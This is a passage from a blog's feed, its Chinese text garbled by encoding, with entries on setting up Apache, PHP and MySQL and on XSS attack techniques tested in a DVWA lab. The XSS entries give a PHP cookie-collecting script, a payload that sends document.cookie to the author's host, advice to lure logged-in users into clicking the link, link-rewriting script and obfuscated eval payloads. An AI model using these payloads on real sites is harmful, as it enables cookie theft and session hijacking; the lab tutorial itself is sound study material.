      <title>WAMP å®‰è£…é…ç½®ä»¥åŠ war åŒ…å¯¼å…¥ Tomcat</title>
      <link href="/blog/2019/08/20/programming/php/php-mysql-apache-war/"/>
      <url>/blog/2019/08/20/programming/php/php-mysql-apache-war/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘è¢« PHP Study å‘æƒ¨äº†ï¼Œæ‰“å¼€ PHP study çš„MySQLã€Aapcheï¼Œåœ¨åå°æ‰¾ä¸åˆ°æœåŠ¡ï¼ŒTomcat å¯¼å…¥ waråŒ…ä¹Ÿè¿æ¥ä¸ä¸Šæ•°æ®åº“ï¼Œéƒ½æ˜¯æ³ªå‘€ã€‚</p><p>æ³¨æ„ï¼šè‡ªå·±é…ç½®å¥½ä¸‹é¢çš„ç¯å¢ƒåï¼Œå³ä½¿æ˜¯ç»¿è‰²çš„ phpstudyç­‰è¿™äº›å·¥å…·ä¹Ÿä¸è¦ç”¨äº†ï¼Œå®ƒä¼šç›´æ¥ç¦ç”¨æœ¬åœ°mysqlï¼Œapacheï¼Œè€Œä¸”ä½ è¿˜æ— æƒè®¿é—®ï¼ˆç®¡ç†å‘˜è´¦æˆ·éƒ½ä¸è¡Œï¼‰ï¼Œå”‰ï¼Œæˆ‘å› ä¸ºè¿™åˆé‡è£…äº†ä¸€é</p><p>ç½‘ä¸Šæ‰¾åˆ°çš„æ•™ç¨‹éƒ½å¾ˆå¥½ï¼Œè¿™é‡Œæ¨èä¸€ä¸‹æˆ‘æ­å»ºç¯å¢ƒè¿‡ç¨‹ä¸­å‚è€ƒçš„ä¸¤ç¯‡æ–‡ç« </p><p>æ¨èæ–‡ç« ï¼ˆä¸¤ä¸ªæ–‡ç« ä¸€èµ·çœ‹ï¼Œäº’è¡¥ï¼‰ï¼š</p><p><a href="https://www.cnblogs.com/lx0715/p/9955069.html">windows é…ç½®apache2.4+php7.2+mysql8.0</a></p><p><ahref="https://www.w3xue.com/exp/article/20189/817.html">Apache2.4.34 +php 7.28 + MySQL8.0.12 å®‰è£…åŠé…ç½®</a></p><h1 id="ä¸»è¦æ­¥éª¤">ä¸»è¦æ­¥éª¤</h1><h2 id="apache">apache</h2><ol type="1"><li>ä¿®æ”¹æœåŠ¡å™¨æ ¹è·¯å¾„</li><li>æ·»åŠ  php æ‰©å±•ï¼ˆä¸ php è·¯å¾„æœ‰å…³ï¼‰ï¼Œå¦‚æœä½ è¦ä½¿ç”¨å¤šç‰ˆæœ¬phpï¼Œåªéœ€è¦åœ¨è¿™é‡Œçš„ httpd.confä¸­å¯¹åº”é…ç½®å³å¯ï¼ˆäº‹å®ä¸Šï¼Œä½ å¯ä»¥æå‰å†™å¥½ï¼Œéœ€è¦ç”¨å“ªä¸ªç‰ˆæœ¬ï¼Œè§£æ³¨é‡Šé‚£ä¸ªç‰ˆæœ¬çš„é…ç½®å³å¯ã€‚ï¼‰<ol type="1"><li>åŠ è½½ php ä¸­ä¸ apache ç›¸å…³çš„ dll</li><li>æ·»åŠ  php.ini æ–‡ä»¶è·¯å¾„</li></ol></li><li>å‘½ä»¤è¡Œå®‰è£… apache æœåŠ¡ï¼ˆå¯ä»¥æŒ‡å®šæœåŠ¡åï¼Œé»˜è®¤ä¸ºï¼šApache2.4ï¼‰</li></ol><h2 id="php">PHP</h2><ol type="1"><li>ä¿®æ”¹ php.iniï¼Œé…ç½® php æ‰©å±•çš„è·¯å¾„ï¼ˆä¸è·¯å¾„æœ‰å…³ï¼‰</li><li>æ·»åŠ  mysql æ‰©å±•ã€‚</li></ol><h2 id="mysql">MySQL</h2><ol type="1"><li><p>ä¿®æ”¹ my.ini é…ç½® mysql è·¯å¾„ï¼ˆä¸è·¯å¾„æœ‰å…³ï¼‰</p></li><li><p>åˆå§‹åŒ–</p></li><li><p>å®‰è£…æœåŠ¡</p></li><li><p>è¿›å…¥ mysqlï¼Œä¿®æ”¹å¯†ç </p><p>alter user 'root'@'localhost' identified by 'youpassword';</p></li></ol><h1 id="é‡åˆ°çš„é—®é¢˜">é‡åˆ°çš„é—®é¢˜ï¼š</h1><ol type="1"><li><p>Apache 2.4 ä¸æ”¯æŒ TLS 3.0ï¼Œå› æ­¤ä¼šæŠ¥é”™</p><p>ä½ å¯ä»¥åœ¨ Apache é…ç½®æ–‡ä»¶ httpd.conf ä¸­ æœç´¢ENABLE_TLS13ï¼Œä¼šæœ‰è¿™æ ·ä¸€å¥ Define ENABLE_TLS13 "Yes"è¿™ä¸€å¥è¯å»æ‰å°±è¡Œäº†ï¼Œè¿™æ ·å°± apache å°±ä¸ä¼šä½¿ç”¨ TLS 1.3 äº†ã€‚</p></li><li><p>ç»Ÿä¸€å‘½å</p><p>mysql æˆ‘å®‰è£…çš„æ—¶å€™ï¼ŒæœªæŒ‡å®šæœåŠ¡åç§°ï¼Œæˆ‘å‘ç° mysql å’Œ MySQLéƒ½å¯ä»¥ç”¨ï¼Œå¯¹åº”çš„éƒ½æ˜¯æœåŠ¡ä¸‹ MySQL é‚£ä¸ªæœåŠ¡ï¼Œå®‰è£…æ˜¯å¯ä»¥æŒ‡å®šæœåŠ¡åç§°</p><p>apache ä¹Ÿæ˜¯ï¼ŒæœåŠ¡åç§°é»˜è®¤æ˜¯Apache2.4ï¼Œä½ åœ¨å®‰è£…çš„æ—¶å€™ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šã€‚æä¸€å¥ï¼ŒTomcat 8 é»˜è®¤çš„æœåŠ¡åæ˜¯Tomcat8</p></li><li><p>å¦‚æœå®‰è£…çš„ apacheçš„æ—¶å€™æŠ¥é”™äº†ï¼Œæˆ‘é‡‡ç”¨çš„æ˜¯å¸è½½ï¼Œç„¶åä¿®æ”¹å¯¹åº”é…ç½®è§£å†³ï¼Œç„¶åå†å®‰è£…çš„æ–¹å¼ã€‚</p></li><li><p>å¦‚æœè¦é…ç½®è™šæ‹Ÿä¸»æœºéœ€è¦å°† httpd.conf ä¸‹çš„è¿™ä¸¤å¥è§£æ³¨é‡Šï¼Œè¿™æ ·æ‰èƒ½æ˜¯httpd-vhosts.conf ä¸­çš„é…ç½®ç”Ÿæ•ˆã€‚</p><p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LoadModule vhost_alias_module modules/mod_vhost_alias.so .... Include</span><br><span class="line">conf/extra/httpd-vhosts.conf</span><br></pre></td></tr></table></figure></p><p>æˆ‘é…ç½®çš„ä¸€ä¸ªè™šæ‹Ÿä¸»æœºï¼Œåœ¨ extra/httpd-vhosts.confæœ€ååŠ ä¸Šä¸‹é¢é…ç½®ï¼Œç„¶å è®¡ç®—æœºçš„ host ä¸­æ·»åŠ  lab11.me è½¬åˆ° 127.0.0.1</p><p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#site 2</span><br><span class="line"><span class="tag">&lt;<span class="name">VirtualHost</span> *<span class="attr">:80</span>&gt;</span></span><br><span class="line">ServerName  lab11.me</span><br><span class="line">DocumentRoot &quot;D:/WWW&quot;</span><br><span class="line"><span class="tag">&lt;<span class="name">Directory</span>  &quot;<span class="attr">D:</span>/<span class="attr">WWW</span>&quot; &gt;</span></span><br><span class="line">#å…è®¸åˆ—å‡ºç›®å½•</span><br><span class="line">Options Indexes</span><br><span class="line">#å…è®¸æƒé™è¦†ç›–</span><br><span class="line">AllowOverride  All</span><br><span class="line">#å…è®¸æ‰€æœ‰è®¿é—®</span><br><span class="line">Require  all  granted</span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line">ErrorLog &quot;logs/lab.me-error.log&quot;</span><br><span class="line">CustomLog &quot;logs/lab.me-access.log&quot; common</span><br><span class="line">DirectoryIndex  abc.php  index.php  index.html</span><br><span class="line"><span class="tag">&lt;/<span class="name">VirtualHost</span>&gt;</span></span><br></pre></td></tr></table></figure></p></li><li><p>apache å¯åŠ¨å‘ç”Ÿ â€œå‘ç”ŸæœåŠ¡ç‰¹å®šé”™è¯¯: 1.â€ å¯èƒ½æ˜¯ php 32 ä½ apache 64ä½ï¼ŒåŠ è½½ dll çš„é—®é¢˜ï¼Œå…·ä½“å¯ä»¥å»çœ‹ windowäº‹ä»¶æ—¥å¿—çš„åº”ç”¨ç¨‹åºæ—¥å¿—ã€‚</p></li><li><p>æ³¨æ„ï¼šapache ä¸è¦ä½¿ç”¨ ntsï¼ˆno thread safeï¼‰php çš„ç‰ˆæœ¬ï¼Œphp ä¸apache ç‰ˆæœ¬ä¹Ÿæœ‰æ­é…ï¼Œæœ‰çš„ç‰ˆæœ¬ä¸æ”¯æŒæœ‰çš„ç‰ˆæœ¬...</p></li></ol><p>å°† war åŒ…å¯¼å…¥ Tomcat è¯·çœ‹ä¸‹é¢åšæ–‡ï¼š</p><p><a href="https://www.cnblogs.com/yaowen/p/5684455.html">war åŒ…æ”¾å…¥tomcat</a></p><h1 id="æ€»ç»“åæ€">æ€»ç»“åæ€ï¼š</h1><ol type="1"><li>ä¹‹å‰ä¸å¤ªåœ¨æ„ 64 ä½ã€32ä½çš„åŒºåˆ«ï¼Œæœ¬æ¬¡å®‰è£…çŸ¥é“äº†è±¡è¿™ç§å¥—ä»¶ï¼Œç‰ˆæœ¬è¦ä¸€è‡´ã€‚</li><li>å­¦ä¼šäº†çœ‹ç¨‹åºçš„æ—¥å¿—ï¼ŒWindowsç³»ç»Ÿçš„äº‹ä»¶æ—¥å¿—ï¼Œè¿™å¯¹ä»¥åç¡®å®šé—®é¢˜åŸå› å¾ˆæœ‰å¸®åŠ©å‘€ã€‚</li><li>æŒæ¡äº†å¤šç‰ˆæœ¬ php çš„é…ç½®ï¼Œå½“ç„¶ï¼Œä¹Ÿå¯ä»¥å¤šç‰ˆæœ¬ mysql é“ç†éƒ½ä¸€æ ·ã€‚</li><li>æŒæ¡äº†å°† war åŒ…å¯¼å…¥ Tomcat çš„æ–¹æ³•ï¼Œç®€å•æ–¹ä¾¿ã€‚</li></ol>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS æ¼æ´çš„æ”»å‡»æ‰‹æ³•</title>
      <link href="/blog/2019/08/15/websec/xss/cookie_and%20_reflected_xss/"/>
      <url>/blog/2019/08/15/websec/xss/cookie_and%20_reflected_xss/</url>
      
        <content type="html"><![CDATA[<h1 id="cookie-åŠ«æŒ">Cookie åŠ«æŒ</h1><h2 id="åŸç†">åŸç†</h2><p>é¦–å…ˆï¼Œæˆ‘ä»¬æœ‰ä¸ªæœåŠ¡å™¨ï¼Œå½“ç„¶ï¼Œè¿™é‡Œæˆ‘åœ¨è‡ªå·±ç”µè„‘ä¸Šç”¨ php studyæ­å»ºä¸€ä¸ªæœåŠ¡å™¨</p><p>å…¶æ¬¡ï¼Œæˆ‘ä»¬éœ€è¦æœ‰ä¸ªè„šæœ¬æ¥è·å–ç”¨æˆ·çš„ cookieï¼Œå†™å…¥åˆ°æˆ‘ä»¬ç”µè„‘ä¸Šã€‚</p><p>ä¸‹é¢æˆ‘ä»¬å†™ä¸€ä¸ªè„šæœ¬ï¼šcookie.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$cookie</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;cookie.txt&#x27;</span>,<span class="variable">$cookie</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°†å…¶æ”¾åˆ° PHP Study çš„ WWW ç›®å½•ä¸‹çš„ xss_test ç›®å½•ä¸‹ã€‚</p><p>ç„¶åï¼Œæˆ‘ä»¬é€šè¿‡æµè§ˆå™¨å¯¹è±¡ä¸­çš„ Location å¯¹è±¡æ¥æ”¹å˜å½“å‰çš„ URLï¼Œå°†å½“å‰cookie æäº¤åˆ°æˆ‘ä»¬æŒ‡å®šçš„ URL çš„è„šæœ¬æ–‡ä»¶ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥åœ¨è„šæœ¬æ–‡ä»¶ä¸­å°†cookie ä¿ç•™ä¸‹æ¥ã€‚</p><p>æ³¨ï¼š</p><p><strong>Document.location</strong> æ˜¯ä¸€ä¸ªåªè¯»å±æ€§ï¼Œè¿”å›ä¸€ä¸ª <ahref="https://developer.mozilla.org/zh-CN/docs/Web/API/Location"><code>Location</code></a>å¯¹è±¡ï¼ŒåŒ…å«æœ‰æ–‡æ¡£çš„ URL ç›¸å…³çš„ä¿¡æ¯ï¼Œå¹¶æä¾›äº†æ”¹å˜è¯¥ URL å’ŒåŠ è½½å…¶ä»– URLçš„æ–¹æ³•ã€‚</p><h2 id="æµ‹è¯•">æµ‹è¯•</h2><p>ä¸‹é¢æˆ‘è®¿é—®è™šæ‹Ÿæœºçš„ dvwa çš„åå°„ XSSï¼Œå¹¶ä½¿ç”¨ hackbar å°†æ„é€ çš„ä¸‹åˆ—paylaod è¿›è¡Œ URL ç¼–ç ï¼ˆæ³¨ï¼šGET æ–¹å¼çš„ payload ä¸èƒ½ç›´æ¥å†™åˆ°åœ°å€æ ï¼Œè¦ç»è¿‡URL ç¼–ç ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.location=<span class="string">&#x27;http://ä½ çš„ä¸»æœºip/xss_test/cookie.php?cookie=&#x27;</span>+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œâ€œä½ çš„ä¸»æœº ipâ€ å†™ä½ ä¸»æœºçš„ ipï¼Œè¿™æ ·</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.107.156/dvwa-master/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location%3D&#x27;http%3A%2F%2F113.54.198.24%2Fxss_test%2Fcookie.php%3Fcookie%3D&#x27;%2Bdocument.cookie%3C%2Fscript%3E</span></span><br></pre></td></tr></table></figure><p>ç„¶åï¼Œæˆ‘ä»¬å°±å¯ä»¥å‘ç»™åˆ«äººï¼Œå…ˆè®©ä»–ä»¬ç™»å½•å¯¹åº”ç½‘ç«™ï¼Œç„¶åè¯±ä½¿å…¶ç‚¹å‡»è¯¥URLï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è·å–å…¶ cookie äº†ã€‚</p><p>æ³¨æ„ï¼šé«˜ç‰ˆæœ¬çš„ phpstudyï¼ˆæ²¡å‡†æ˜¯ php ç‰ˆæœ¬ æˆ– apache ç‰ˆæœ¬é«˜ï¼Ÿï¼‰é»˜è®¤å¢åŠ usertokenï¼Œæµ‹è¯•ä¼šä¸æ­£å¸¸ã€‚</p><p>è¿™æ ·æˆ‘ä»¬ä½¿ç”¨é€šè¿‡ä¿®æ”¹æµè§ˆå™¨ cookie æˆ–ä½¿ç”¨ burp æˆªè·å¹¶ä¿®æ”¹ cookieæ¥å®ç°ä¼šè¯åŠ«æŒã€‚</p><p>åŠ«æŒä¼šè¯åçš„æ“ä½œ</p><ol type="1"><li>æŸ¥çœ‹ä¿¡æ¯ï¼Œä¿®æ”¹é…ç½®</li><li>å¯»æ‰¾å…¶ä»–æ¼æ´ç‚¹ï¼Œæ¯”å¦‚ï¼šå¯»æ‰¾æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œä¸Šä¼ ä¸€å¥è¯ã€‚</li></ol><h1 id="ç¯¡æ”¹ç½‘é¡µé“¾æ¥">ç¯¡æ”¹ç½‘é¡µé“¾æ¥</h1><h2 id="åŸç†-1">åŸç†</h2><p>window.onload å½“çª—å£åŠ è½½æ—¶ï¼Œæ‰§è¡ŒåŒ¿åå‡½æ•°</p><p>ä½¿ç”¨ for å¾ªç¯éå†æ‰€æœ‰è·å¾—çš„é“¾æ¥çš„ a æ ‡ç­¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">window.onload = function()</span><br><span class="line">&#123;</span><br><span class="line">var links=document.getElementsByTagName(&quot;a&quot;);</span><br><span class="line">for(var i =0; i &lt; links.length;i++)</span><br><span class="line">links.href=&quot;www.baidu.com&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="æµ‹è¯•-1">æµ‹è¯•</h2><p>å°†ç¯¡æ”¹ä»£ç æ³¨å…¥åˆ°å¯¹åº”çš„ XSS ä½ç½®ï¼Œä»¥ DVWA åå°„å‹ XSSä¸ºä¾‹ï¼Œæˆ‘ä»¬åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥ä¸Šé¢çš„ä»£ç ï¼Œç„¶åä½¿ç”¨æ£€æŸ¥å…ƒç´ æ–¹å¼ï¼Œä¾¿å¯ä»¥æŸ¥çœ‹ä¿®æ”¹åçš„é“¾æ¥ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.107.156/dvwa-master/vulnerabilities/xss_r/?name=%3Cscript%3E%0Awindow.onload%20%3D%20function()%0A%7B%0A%09var%20links%3Ddocument.getElementsByTagName(%22a%22)%3B%0A%09for(var%20i%20%3D%200%3B%20i%20%3C%20links.length%3Bi%2B%2B)%0A%09%09links%5Bi%5D.href%3D%22https%3A%2F%2Fwww.baidu.com%22%3B%0A%7D%0A%3C%2Fscript%3E</span></span><br></pre></td></tr></table></figure><p>æ³¨å…¥åï¼Œç½‘é¡µé“¾æ¥å˜éƒ½ä¼šæ”¹å˜ä¸ºä½ é‡å®šå‘çš„ç½‘é¡µè¿æ¥ï¼Œè¿™æ ·å°±è¾¾åˆ°äº†ç¯¡æ”¹ç½‘é¡µé“¾æ¥çš„ç›®çš„ï¼Œå½“ç„¶ï¼Œåå°„å‹åªæ˜¯ä¸€æ—¶çš„ï¼Œå­˜å‚¨å‹XSS å¯¹ç¯¡æ”¹ç½‘é¡µé“¾æ¥æŒä¹…æœ‰æ•ˆã€‚</p><p>æœªå®Œå¾…ç»­...</p>]]></content>
      
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS æ¶‰åŠçš„ä¸€äº›ç¼–ç ä¸å¼•å·é—®é¢˜</title>
      <link href="/blog/2019/08/15/websec/xss/some_encoding_js_html/"/>
      <url>/blog/2019/08/15/websec/xss/some_encoding_js_html/</url>
      
        <content type="html"><![CDATA[<h1 id="html-å±æ€§å€¼çš„å¼•å·é—®é¢˜">html å±æ€§å€¼çš„å¼•å·é—®é¢˜</h1><p>å¦‚æœ htmlæ–‡ä»¶åœ¨å†™å±æ€§å€¼æ²¡æœ‰ç”¨æ‹¬å·åŒ…å›´ï¼Œé»˜è®¤è§åˆ°ç©ºæ ¼ä¼šè®¤ä¸ºè¯¥å±æ€§å€¼å·²ç»å®Œç»“ï¼Œåé¢çš„å­—æ¯å®ƒä¼šè®¤ä¸ºæ˜¯ä¸€ä¸ªç©ºå±æ€§ã€‚</p><p>htmlä¸­æˆå¯¹ä½¿ç”¨ä¸Šï¼Œä¸ç¼ºåˆ†å•åŒå¼•å·ï¼Œä½†æ˜¯å¦‚æœå¼•å·è¦åµŒå¥—çš„è¯ï¼Œæœ‰å››ç§è§£å†³æ–¹å¼ï¼š</p><ol type="1"><li>å†…åŒå¼•å·ï¼Œå¤–å•å¼•å·</li><li>å†…å•å¼•å·ï¼Œå¤–åŒå¼•å·</li><li>å¤–éƒ¨ä¸ä½¿ç”¨å¼•å·</li><li>å†…éƒ¨ä½¿ç”¨ HTML çš„å®ä½“ç¼–ç ï¼š&amp;quot;</li></ol><h1 id="alert-å‡½æ•°">alert å‡½æ•°</h1><p>äº‹ä»¶ç»‘å®šå‡½æ•° alertä¸­çš„å‚æ•°ï¼Œå¦‚æœæ˜¯æ•°å­—å¯ä»¥ç›´æ¥å†™ï¼Œå¦‚æœæ˜¯å­—ç¬¦ä¸²è¦åŠ å•å¼•å·ï¼Œå…¶ä»–å‡½æ•°ä¹Ÿæ˜¯è¿™æ ·</p><h1 id="js-ä¸­å­—ç¬¦ä¸²çš„è¡¨ç¤ºæ–¹å¼">js ä¸­å­—ç¬¦ä¸²çš„è¡¨ç¤ºæ–¹å¼</h1><p>JavaScript å…±æœ‰ 6ç§æ–¹æ³•å¯ä»¥è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ï¼Œå½“ç„¶å­—ç¬¦ä¸²å°±æ˜¯ä¸€ä¸ªä¸ªå­—ç¬¦æ‹¼æ¥èµ·æ¥çš„äº†</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;z&quot;</span> === <span class="string">&quot;z&quot;</span>; <span class="comment">// true</span></span><br><span class="line"><span class="string">&quot;\172&quot;</span> === <span class="string">&quot;z&quot;</span>; <span class="comment">// true8è¿›åˆ¶</span></span><br><span class="line"><span class="string">&quot;\x7A&quot;</span> === <span class="string">&quot;z&quot;</span>; <span class="comment">// true16è¿›åˆ¶</span></span><br><span class="line"><span class="string">&quot;\u007A&quot;</span> === <span class="string">&quot;z&quot;</span>; <span class="comment">// trueunicodeç¼–ç </span></span><br><span class="line"><span class="string">&quot;\u&#123;7A&#125;&quot;</span> === <span class="string">&quot;z&quot;</span>; <span class="comment">// trueå¸¦æ‹¬å·çš„unicodeç¼–ç </span></span><br></pre></td></tr></table></figure><h1 id="js-ä¸­çš„å¸¸ç”¨ç¼–ç ç›¸å…³å‡½æ•°">Js ä¸­çš„å¸¸ç”¨ç¼–ç ç›¸å…³å‡½æ•°</h1><p>fromCharCode() å¯æ¥å—ä¸€ä¸ªæŒ‡å®šçš„ Unicode å€¼ï¼Œç„¶åè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</p><p>è¯­æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String.fromCharCode(numX,numX,...,numX)</span><br></pre></td></tr></table></figure><table><colgroup><col style="width: 5%" /><col style="width: 94%" /></colgroup><thead><tr class="header"><th style="text-align: left;">å‚æ•°</th><th style="text-align: left;">æè¿°</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">numX</td><td style="text-align: left;">å¿…éœ€ã€‚ä¸€ä¸ªæˆ–å¤šä¸ª Unicodeå€¼ï¼Œå³è¦åˆ›å»ºçš„å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦çš„ Unicode ç¼–ç ã€‚</td></tr></tbody></table><h2 id="æç¤ºå’Œæ³¨é‡Š">æç¤ºå’Œæ³¨é‡Š</h2><p><strong>æ³¨é‡Šï¼š</strong>è¯¥æ–¹æ³•æ˜¯ Stringçš„é™æ€æ–¹æ³•ï¼Œå­—ç¬¦ä¸²ä¸­çš„æ¯ä¸ªå­—ç¬¦éƒ½ç”±å•ç‹¬çš„æ•°å­— Unicode ç¼–ç æŒ‡å®šã€‚</p><p>å®ƒä¸èƒ½ä½œä¸ºæ‚¨å·²åˆ›å»ºçš„ String å¯¹è±¡çš„æ–¹æ³•æ¥ä½¿ç”¨ã€‚å› æ­¤å®ƒçš„è¯­æ³•åº”è¯¥æ˜¯String.fromCharCode()ï¼Œè€Œä¸æ˜¯ myStringObject.fromCharCode()ã€‚</p><p>æ³¨æ„ï¼šåœ¨è¿™é‡Œ numX ä¸å…¶å‰é¢çš„é€—å·ä¹‹é—´æœ‰æ— ç©ºæ ¼å‡å¯ï¼Œä½†æ˜¯åœ¨ htmlä¸­ï¼Œå¦‚æœæˆ‘ä»¬æ˜¯è¿™æ ·ä½¿ç”¨ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span></span></span><br><span class="line"><span class="tag">    <span class="attr">src</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">onerror</span>=<span class="string">&quot;eval(String.fromCharCode(97,108,101,&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">114</span>,<span class="attr">116</span>,<span class="attr">40</span>,<span class="attr">49</span>,<span class="attr">41</span>))</span></span><br><span class="line"><span class="tag">/&gt;</span></span><br></pre></td></tr></table></figure><p>å†æ‰©å¤§ä¸€ç‚¹ï¼Œæ˜¯æˆ‘ä»¬åœ¨å±æ€§å€¼ä¸­ä½¿ç”¨String.fromCharCode()ï¼Œæ‰€ä»¥å¦‚æœä½ ä½¿ç”¨ä¸Šé¢ payload çš„æ—¶å€™ï¼Œå¦‚æœString.fromCharCode(97,108,101, 114,116,40,49,41)ä¸­çš„é€—å·ä¹‹åæœ‰ç©ºæ ¼ï¼Œå°±ä¸ä¼šè§¦å‘ XSSï¼Œæ‰€ä»¥æˆ‘ä»¬æœ‰ä¸¤ç§è§£å†³æ–¹å¼ï¼š</p><ol type="1"><li><p>ä¸åŠ ç©ºæ ¼ï¼ˆæ³¨ï¼šæœ‰çš„ hackbar è‡ªå¸¦ç©ºæ ¼å°±å¾ˆä¸å¤ªå¥½ï¼Œå¯ä»¥ä½¿ç”¨ chromeæ’ä»¶ä¸­çš„å›¾æ ‡ä¸º H çš„é‚£ä¸ª hackbarï¼Œä¹‹å‰ä¹Ÿä»‹ç»è¿‡ã€‚ï¼‰ã€‚</p></li><li><p>å°†å±æ€§å€¼ç”¨å¼•å·åŒ…å›´èµ·æ¥</p><p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span></span></span><br><span class="line"><span class="tag">    <span class="attr">src</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">onerror</span>=<span class="string">&quot;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))&quot;</span></span></span><br><span class="line"><span class="tag">/&gt;</span></span><br></pre></td></tr></table></figure></p><p>è¿™æ ·ï¼Œç©ºæ ¼å•¥çš„å°±ä¸ä¼šè¢«è¯¯è®¤ä¸ºæ˜¯å±æ€§å€¼çš„ç»“æŸäº†ã€‚</p></li></ol><p>æ¨èé˜…è¯»ï¼š</p><p><ahref="https://blog.csdn.net/shadow_zed/article/details/71076339">htmlæ ‡ç­¾ä¸­ï¼Œå•å¼•å·å’ŒåŒå¼•å·åŒºåˆ«ï¼š</a></p><p><a href="http://es6.ruanyifeng.com/#docs/string">å­—ç¬¦ä¸²çš„æ‰©å±•</a></p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> xss </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS åŸºç¡€åŠåˆ†ç±»</title>
      <link href="/blog/2019/08/15/websec/xss/xss_classification/"/>
      <url>/blog/2019/08/15/websec/xss/xss_classification/</url>
      
